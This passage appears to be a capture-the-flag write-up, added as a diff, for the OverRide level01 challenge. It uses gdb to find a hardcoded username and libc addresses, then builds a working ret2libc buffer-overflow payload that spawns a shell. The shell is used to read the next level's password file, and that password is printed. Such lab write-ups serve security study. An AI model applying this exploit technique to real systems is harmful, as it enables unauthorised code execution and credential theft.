@@ -1,0 +1,60 @@
+When laucnhing the script, it is asking for a username and a password.
+Using gdb we can find a username "dat_wil" and a password "admin"
+    (gdb) disas verify_user_name
+    ...
+    0x08048478 <+20>:    mov    $0x804a040,%edx
+    ...
+    0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)
+    ...
+
+    (gdb) x/x 0x804a040
+    0x804a040 <a_user_name>:        0x5f746164 (= 'dat_')
+    (gdb) x/x 0x804a040+4
+    0x804a044 <a_user_name+4>:      0x0a6c6977 (= 'wil')
+
+The password doesn't work but we can see there is an overflow when we give 80+ characters.
+We will do an overflow on the password check to call a shell.
+
+Our payload will look like : username\n + filling_passwd_buffer + call_to_system + exit_address + /bin/sh
+
+We find address of exit, system and /bin/sh with
+
+    (gdb) info proc map
+    Mapped address spaces:
+
+    Start Addr   End Addr       Size     Offset objfile
+        0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
+        0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
+        0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
+    0xf7e2b000 0xf7e2c000     0x1000        0x0 
+    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+    0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+    0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+    0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+    0xf7fd0000 0xf7fd4000     0x4000        0x0 
+    0xf7fd8000 0xf7fdb000     0x3000        0x0 
+    0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+    0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+    0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+    0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+    0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+    (gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
+    0xf7f897ec
+    1 pattern found.
+    (gdb) info function system
+    0xf7e6aed0  __libc_system
+    (gdb) info function system
+    0xf7e5eb70  exit
+
+
+python -c 'print "dat_wil\n" + "B"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/payload
+level01@OverRide:~$ cat /tmp/payload - | ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
